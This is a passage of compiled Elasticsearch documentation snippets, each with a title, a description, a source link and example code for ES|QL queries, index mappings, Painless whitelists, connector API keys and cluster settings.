@timestamp > NOW() - 1 hour\n```\n\n----------------------------------------\n\nTITLE: Extracting Maximum X Coordinate in ESQL\nDESCRIPTION: This ESQL snippet extracts maximum and minimum boundary values from city boundaries, specifically focusing on the x-axis, using various spatial functions like ST_ENVELOPE and ST_XMAX. The main dependency is the `airport_city_boundaries` dataset. Key inputs include the city boundary while outputs are the calculated boundary extremes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_xmax.md#2025-04-21_snippet_0\n\nLANGUAGE: ESQL\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE abbrev == \"CPH\"\n| EVAL envelope = ST_ENVELOPE(city_boundary)\n| EVAL xmin = ST_XMIN(envelope), xmax = ST_XMAX(envelope), ymin = ST_YMIN(envelope), ymax = ST_YMAX(envelope)\n| KEEP abbrev, airport, xmin, xmax, ymin, ymax\n```\n\n----------------------------------------\n\nTITLE: Sorting Highlighted Fragments by Score in Elasticsearch\nDESCRIPTION: This example shows how to sort highlighted fragments by score in an Elasticsearch search query. It specifies the 'order' parameter as 'score' and configures fragment size and number for the 'comment' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"order\" : \"score\",\n    \"fields\" : {\n      \"comment\" : {\"fragment_size\" : 150, \"number_of_fragments\" : 3}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Index with Percolator for Reindexing\nDESCRIPTION: Creates an index with percolator mapping and adds an alias for better maintainability during reindexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"query\" : {\n        \"type\" : \"percolator\"\n      },\n      \"body\" : {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n\nPOST _aliases\n{\n  \"actions\": [\n    {\n      \"add\": {\n        \"index\": \"index\",\n        \"alias\": \"queries\"\n      }\n    }\n  ]\n}\n\nPUT queries/_doc/1?refresh\n{\n  \"query\" : {\n    \"match\" : {\n      \"body\" : \"quick brown fox\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Translog Flush Threshold Size in Elasticsearch YAML\nDESCRIPTION: Sets the maximum total size of operations in the translog before a flush occurs, generating a new Lucene commit point. This prevents recoveries from taking too long. The default is 10 GB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/translog.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nindex.translog.flush_threshold_size: 10GB\n```\n\n----------------------------------------\n\nTITLE: Querying SharePoint Site ID using Graph API\nDESCRIPTION: This HTTP GET request fetches the site ID for a specific SharePoint site using the Microsoft Graph API. The query includes parameters to select specific fields and search for the site by name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nGET https://graph.microsoft.com/v1.0/sites?select=webUrl,Title,Id&$search=\"<Name of the site>*\"\n```\n\n----------------------------------------\n\nTITLE: Gradle Configuration for Elasticsearch Tracing\nDESCRIPTION: This Groovy code configures Elasticsearch tracing by enabling telemetry tracing and setting the transaction sample rate to 1.0, ensuring that every transaction is sampled. These settings are added to the existing configuration for metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/METERING.md#2025-04-21_snippet_4\n\nLANGUAGE: groovy\nCODE:\n```\nsetting 'telemetry.tracing.enabled', 'true'\nsetting 'telemetry.agent.transaction_sample_rate', '1.0' //ensure every transaction is sampled\n```\n\n----------------------------------------\n\nTITLE: Using minimum_should_match for Single Field\nDESCRIPTION: Shows how to use minimum_should_match parameter to require that at least a certain number of terms match. This example requires at least two of the three terms to match in the title field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"fields\": [\n        \"title\"\n      ],\n      \"query\": \"this that thus\",\n      \"minimum_should_match\": 2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Service Account Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for setting up service account token authentication in Elasticsearch. This enables service accounts to authenticate via tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: service_account\n```\n\n----------------------------------------\n\nTITLE: Enriching Data with Languages Policy in ESQL\nDESCRIPTION: Demonstrates enriching a single row of data using a languages policy. The query takes a row with value '1' and enriches it using a languages_policy, resulting in language name mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/enrich.csv-spec/enrich_on.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source for Text Fields with Keyword Sub-fields\nDESCRIPTION: Example showing how to create an index with synthetic _source enabled and a text field that has a keyword sub-field. This configuration allows the text field to support synthetic _source functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/text.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"raw\": {\n            \"type\": \"keyword\"\n          }\n        }\n      }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"text\": [\n    \"the quick brown fox\",\n    \"the quick brown fox\",\n    \"jumped over the lazy dog\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Converting P12 to PEM format with OpenSSL\nDESCRIPTION: This OpenSSL command converts the CA certificate from PKCS#12 format (`ca.p12`) to PEM format (`ca.pem`). It extracts the certificate information without the private key and requires the password used during the creation of the PKCS#12 file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/reindex/src/test/resources/org/elasticsearch/reindex/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nopenssl pkcs12 -info -in ./ca.p12 -nokeys -out ca.pem -passin \"pass:ca-password\"\n```\n\n----------------------------------------\n\nTITLE: Division with 'def' Type in Painless\nDESCRIPTION: Illustrates division with the '/' operator and the 'def' type in Painless. The 'def' type automatically infers the type, so integer division rules apply if both operands are effectively integers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_17\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5/4; <1>\ndef y = x/2; <2>\n```\n\n----------------------------------------\n\nTITLE: Configuring Top-Level Mapping with Subobjects Disabled in Elasticsearch\nDESCRIPTION: This example demonstrates how to disable subobjects for the entire mapping, making the document only able to hold leaf fields without any nested object structure. Field names with dots are preserved throughout the document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/subobjects.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"subobjects\": false <1>\n  }\n}\n\nPUT my-index-000001/_doc/metric_1\n{\n  \"time\" : \"100ms\", <2>\n  \"time.min\" : \"10ms\",\n  \"time.max\" : \"900ms\"\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Documentation Header Comment\nDESCRIPTION: Auto-generation notice for the MV_MEDIAN function documentation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_median.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Including Type Information for LOG Function\nDESCRIPTION: This snippet includes the type information for the LOG function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/log.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/log.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining Czech Stop Words\nDESCRIPTION: Lists the Czech stop words for use within Elasticsearch, complete with a relevant Lucene stop words link.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_12\n\nLANGUAGE: markdown\nCODE:\n```\n`_czech_`\n:   [Czech stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/cz/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Geometry Type Filtering\nDESCRIPTION: This Painless script filters documents based on the geometry type of a point field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_21\n\nLANGUAGE: Painless\nCODE:\n```\nInternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.eq(InternalSqlScriptUtils.stGeometryType(InternalSqlScriptUtils.geoDocValue(doc,params.v0)),params.v1))\n```\n\n----------------------------------------\n\nTITLE: Calculating Cotangent in SQL\nDESCRIPTION: The COT function returns the cotangent of a numeric expression, which is an angle in radians. It requires one numeric input and outputs a double numeric value. If the input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_44\n\nLANGUAGE: sql\nCODE:\n```\nCOT(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Example Content of Stemmer Override Rules File\nDESCRIPTION: This snippet shows the content of a stemmer override rules file. It defines custom stemming rules for specific words.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-override-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nrunning, runs => run\n\nstemmer => stemmer\n```\n\n----------------------------------------\n\nTITLE: Json Class Methods for Loading and Dumping Data\nDESCRIPTION: This snippet outlines methods in the org.elasticsearch.painless.api.Json class for handling JSON data. The load method accepts a String for parsing JSON content, while the dump methods convert a defined object into a JSON string format. One of the dump methods allows for an additional boolean parameter for configuration purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_1\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Including BUCKET Function Data Types in Markdown\nDESCRIPTION: This snippet includes the data types section for the BUCKET function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/bucket.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/bucket.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Retrieving TAU Constant in ESQL\nDESCRIPTION: Demonstrates how to return the mathematical constant tau (2π) using the TAU() function. Returns a double precision value approximately equal to 6.283185307179586.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/tau.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW TAU()\n```\n\n----------------------------------------\n\nTITLE: Custom Fingerprint Analyzer Implementation\nDESCRIPTION: Demonstrates how to recreate the fingerprint analyzer as a custom analyzer for further customization using standard tokenizer and specific token filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /fingerprint_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_fingerprint\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"asciifolding\",\n            \"fingerprint\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Bengali Stop Words\nDESCRIPTION: Lists the Bengali stop words applicable in Elasticsearch, with a hyperlink to the Lucene resource.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\n`_bengali_`\n:   [Bengali stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/bn/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Auto-Flattened Mapping Response in Elasticsearch\nDESCRIPTION: This console result shows the auto-flattened mapping after configuring nested objects under a field with 'subobjects: false'. The mapping shows how object hierarchies are converted to dot notation fields automatically.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/subobjects.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my-index-000002\" : {\n    \"mappings\" : {\n      \"properties\" : {\n        \"metrics\" : {\n          \"subobjects\" : false,\n          \"properties\" : {\n            \"time.min\" : { <1>\n              \"type\" : \"long\"\n            },\n            \"time.max\" : {\n              \"type\" : \"long\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining NullPointerException in Java\nDESCRIPTION: This snippet defines the java.lang.NullPointerException class, thrown when attempting to use a null reference in a case where an object reference is required. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_45\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.NullPointerException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining IllegalStateException in Java\nDESCRIPTION: This snippet defines the java.lang.IllegalStateException class, thrown to indicate that a method has been called at an illegal or inappropriate time. In other words, the Java environment or Java application is not in an appropriate state for the requested operation. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_37\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IllegalStateException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Logger Level in Console\nDESCRIPTION: Shows how to dynamically update logging settings. This example increases the logging level of the 'indices.recovery' module to DEBUG.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/miscellaneous-cluster-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /_cluster/settings\n{\n  \"persistent\": {\n    \"logger.org.elasticsearch.indices.recovery\": \"DEBUG\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for ESQL Percentile Function in Markdown\nDESCRIPTION: A markdown table showing the supported input types (number and percentile) and the resulting output type for the percentile function in ESQL. It covers combinations of double, integer, and long input types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/percentile.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | percentile | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n```\n\n----------------------------------------\n\nTITLE: Calculating Logarithm with Custom Base in ESQL\nDESCRIPTION: This example demonstrates how to use the LOG function with a custom base in ESQL. It calculates the logarithm of 8.0 with base 2.0.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/log.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW base = 2.0, value = 8.0\n| EVAL s = LOG(base, value)\n```\n\n----------------------------------------\n\nTITLE: Defining ArithmeticException in Java\nDESCRIPTION: This snippet defines the java.lang.ArithmeticException class, which is thrown when an exceptional arithmetic condition has occurred. It includes two constructors: a default constructor and one that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_26\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ArithmeticException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Version String with CONCAT and Type Casting in ESQL\nDESCRIPTION: Creates a version string by concatenating an incremented integer with string literals and casting the result to VERSION type. Converts 0 to INT, adds 1, casts to STRING, concatenates with '.2.3', and finally casts to VERSION type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/cast.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW ver = CONCAT((\"0\"::INT + 1)::STRING, \".2.3\")::VERSION\n```\n\n----------------------------------------\n\nTITLE: Defining TypeNotPresentException in Java\nDESCRIPTION: This snippet defines the java.lang.TypeNotPresentException class, thrown when an application tries to access a type using a string representing the type's name, but no definition for the type with the specified name can be found. It includes a method `typeName()`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_50\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.TypeNotPresentException {\n  String typeName()\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an API key for the connector - Console - Elasticsearch\nDESCRIPTION: This snippet illustrates how to generate an API key for a Slack connector in Elasticsearch. The command requires specifying the name and role descriptors including necessary privileges for managing the connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-slack.md#2025-04-21_snippet_1\n\nLANGUAGE: Console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Multiple Field Analyzers for Unified Highlighter\nDESCRIPTION: Creates an Elasticsearch index named 'index1' with a text field 'comment' that uses the standard analyzer and a subfield 'comment.english' that uses the English analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPUT index1\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comment\": {\n        \"type\": \"text\",\n        \"analyzer\": \"standard\",\n        \"fields\": {\n          \"english\": {\n            \"type\": \"text\",\n            \"analyzer\": \"english\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including ESQL MV_SUM Function Documentation Components\nDESCRIPTION: This snippet shows how the documentation for the MV_SUM function is assembled from separate components using includes. It references a syntax diagram and several markdown files containing different aspects of the function documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `MV_SUM` [esql-mv_sum]\n\n**Syntax**\n\n:::{image} ../../../images/functions/mv_sum.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/mv_sum.md\n:::\n\n:::{include} ../description/mv_sum.md\n:::\n\n:::{include} ../types/mv_sum.md\n:::\n\n:::{include} ../examples/mv_sum.md\n:::\n```\n\n----------------------------------------\n\nTITLE: RRF Query with Multiple Standard Retrievers\nDESCRIPTION: Example showing how to combine BM25 and ELSER queries using RRF in Elasticsearch for improved relevance scoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET example-index/_search\n{\n    \"retriever\": {\n        \"rrf\": {\n            \"retrievers\": [\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"term\": {\n                                \"text\": \"blue shoes sale\"\n                            }\n                        }\n                    }\n                },\n                {\n                    \"standard\": {\n                        \"query\": {\n                            \"sparse_vector\":{\n                                \"field\": \"ml.tokens\",\n                                \"inference_id\": \"my_elser_model\",\n                                \"query\": \"What blue shoes are on sale?\"\n                            }\n                        }\n                    }\n                }\n            ],\n            \"rank_window_size\": 50,\n            \"rank_constant\": 20\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Email Analysis Configuration - Elasticsearch Pattern Capture\nDESCRIPTION: Elasticsearch configuration for analyzing email addresses using pattern capture filter\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n   \"settings\" : {\n      \"analysis\" : {\n         \"filter\" : {\n            \"email\" : {\n               \"type\" : \"pattern_capture\",\n               \"preserve_original\" : true,\n               \"patterns\" : [\n                  \"([^@]+)\",\n                  \"(\\\\p{L}+)\",\n                  \"(\\\\d+)\",\n                  \"@(.+)\"\n               ]\n            }\n         },\n         \"analyzer\" : {\n            \"email\" : {\n               \"tokenizer\" : \"uax_url_email\",\n               \"filter\" : [ \"email\", \"lowercase\",  \"unique\" ]\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Geometry Type Support Matrix in Markdown\nDESCRIPTION: A markdown table showing supported geometry type combinations and their corresponding boolean return values. The table covers both Cartesian (point/shape) and geographic (point/shape) coordinate systems.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/st_disjoint.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| geomA | geomB | result |\n| --- | --- | --- |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_point | cartesian_shape | boolean |\n| cartesian_shape | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| geo_point | geo_point | boolean |\n| geo_point | geo_shape | boolean |\n| geo_shape | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n```\n\n----------------------------------------\n\nTITLE: Java Iterable Interface Definition with Painless Augmentations\nDESCRIPTION: Specifies the Iterable interface including standard Java methods and Painless-specific augmentations for collection operations like grouping, filtering, and aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.Iterable {\n  void forEach(Consumer)\n  Iterator iterator()\n  Spliterator spliterator()\n  boolean org.elasticsearch.painless.api.Augmentation any(Predicate)\n  Collection org.elasticsearch.painless.api.Augmentation asCollection()\n  List org.elasticsearch.painless.api.Augmentation asList()\n  def org.elasticsearch.painless.api.Augmentation each(Consumer)\n  def org.elasticsearch.painless.api.Augmentation eachWithIndex(ObjIntConsumer)\n  boolean org.elasticsearch.painless.api.Augmentation every(Predicate)\n  List org.elasticsearch.painless.api.Augmentation findResults(Function)\n  Map org.elasticsearch.painless.api.Augmentation groupBy(Function)\n  String org.elasticsearch.painless.api.Augmentation join(String)\n  double org.elasticsearch.painless.api.Augmentation sum()\n  double org.elasticsearch.painless.api.Augmentation sum(ToDoubleFunction)\n}\n```\n\n----------------------------------------\n\nTITLE: Restricting Java Reflection Access Violation\nDESCRIPTION: Forbids reflection methods that bypass Java's access control system, recommending public API alternatives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_11\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Do not violate java's access system\njava.lang.Class#getDeclaredClasses() @ Do not violate java's access system: Use getClasses() instead\njava.lang.Class#getDeclaredConstructor(java.lang.Class[]) @ Do not violate java's access system: Use getConstructor() instead\njava.lang.Class#getDeclaredConstructors() @ Do not violate java's access system: Use getConstructors() instead\njava.lang.Class#getDeclaredField(java.lang.String) @ Do not violate java's access system: Use getField() instead\njava.lang.Class#getDeclaredFields() @ Do not violate java's access system: Use getFields() instead\njava.lang.Class#getDeclaredMethod(java.lang.String, java.lang.Class[]) @ Do not violate java's access system: Use getMethod() instead\njava.lang.Class#getDeclaredMethods() @ Do not violate java's access system: Use getMethods() instead\njava.lang.reflect.AccessibleObject#setAccessible(boolean)\njava.lang.reflect.AccessibleObject#setAccessible(java.lang.reflect.AccessibleObject[], boolean)\n```\n\n----------------------------------------\n\nTITLE: Stats Bucket Aggregation Response Example\nDESCRIPTION: Shows the response format for a stats bucket aggregation, including the monthly buckets and the calculated statistics (count, min, max, avg, sum) across all buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-stats-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"stats_monthly_sales\": {\n         \"count\": 3,\n         \"min\": 60.0,\n         \"max\": 550.0,\n         \"avg\": 328.3333333333333,\n         \"sum\": 985.0\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Decay Function for Geo Fields\nDESCRIPTION: This snippet shows an example of using the `decayGeoExp` function within a script. It uses parameters such as origin, scale, offset, and decay to calculate the score based on geographic distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"decayGeoExp(params.origin, params.scale, params.offset, params.decay, doc['location'].value)\",\n    \"params\": {\n        \"origin\": \"40, -70.12\",\n        \"scale\": \"200km\",\n        \"offset\": \"0km\",\n        \"decay\" : 0.2\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Confluence Connector\nDESCRIPTION: API call to generate an API key with appropriate permissions for the Confluence connector\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Turkish Stop Words\nDESCRIPTION: Specifies Turkish stop words for Elasticsearch analysis, including a link to the respective Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_39\n\nLANGUAGE: markdown\nCODE:\n```\n`_turkish_`\n:   [Turkish stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/tr/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Creating an Elasticsearch Index with geo_shape Mapping\nDESCRIPTION: Creates an Elasticsearch index named 'example' with a mapping that defines a field 'location' of type 'geo_shape'. This mapping allows the field to store geometric shapes for geospatial queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /example\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch with Pre-indexed GeoShape\nDESCRIPTION: This code snippet shows how to query Elasticsearch using a pre-indexed shape. It references the shape with ID `deu` from the 